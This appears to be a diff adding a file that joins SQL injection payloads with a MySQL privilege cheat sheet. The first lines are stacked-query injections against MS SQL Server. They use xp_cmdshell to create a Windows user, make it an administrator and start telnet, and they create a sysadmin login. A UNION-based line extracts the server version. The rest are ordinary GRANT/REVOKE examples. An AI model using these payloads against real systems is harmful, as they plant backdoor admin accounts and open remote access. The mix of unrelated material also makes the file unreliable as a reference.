@@ -1,1 +1,41 @@
 
+98986；use master;exec dbo.xp_cmdshell 'net user awen /add';
+98986；use master;exec dbo.xp_cmdshell'net user awen password';
+98986；use master;exec dbo.xp_cmdshell'net localgroup administrators awen /add';
+98986；use master;exec dbo.xp_cmdshell'net start tlntsrv';
+98986;use master;exec dbo.password null,password,user;
+98986；use master;exec dbo.sp_addlogin user;
+98986;use master;exec sp_addlogin user;
+98986;use master;exec dbo.password null,password,user;
+98986;use master;exec dbo.sp_addsrvrolemember user,sysadmin;
+123' LIMIT 1,1 UNION ALL SELECT CONCAT(0x3a757a793a,IFNULL(CAST(version() AS CHAR),0x20),0x3a736a763a)#
+grant select on testdb.* to common_user@'%'
+grant insert on testdb.* to common_user@'%'
+grant update on testdb.* to common_user@'%'
+grant delete on testdb.* to common_user@'%'
+grant select, insert, update, delete on testdb.* to common_user@'%'
+grant create on testdb.* to developer@'192.168.0.%';
+grant alter on testdb.* to developer@'192.168.0.%';
+grant drop on testdb.* to developer@'192.168.0.%';
+grant references on testdb.* to developer@'192.168.0.%';
+grant create temporary tables on testdb.* to developer@'192.168.0.%';
+grant create view on testdb.* to developer@'192.168.0.%';
+grant show view on testdb.* to developer@'192.168.0.%';
+grant index on testdb.* to developer@'192.168.0.%';
+grant create routine on testdb.* to developer@'192.168.0.%'; -- now, can show procedure status
+grant alter routine on testdb.* to developer@'192.168.0.%'; -- now, you can drop a procedure
+grant execute on testdb.* to developer@'192.168.0.%';
+grant all privileges on testdb to dba@'localhost'
+grant all on *.* to dba@'localhost'
+grant select on *.* to dba@localhost; -- 
+grant all on *.* to dba@localhost; -- 
+grant select, insert, update, delete on testdb.orders to dba@localhost;
+grant select(user_id,username) on smp.users to mo_user@'%' identified by '123345';
+grant select on smp.mo_sms to mo_user@'%' identified by '123345';
+grant select(id, se, rank) on testdb.apache_log to dba@localhost;
+grant execute on procedure testdb.pr_add to 'dba'@'localhost'
+grant execute on function testdb.fn_add to 'dba'@'localhost'
+show grants for dba@localhost;
+grant all on *.* to dba@localhost;
+revoke all on *.* from dba@localhost;
+grant select on testdb.* to dba@localhost with grant option;
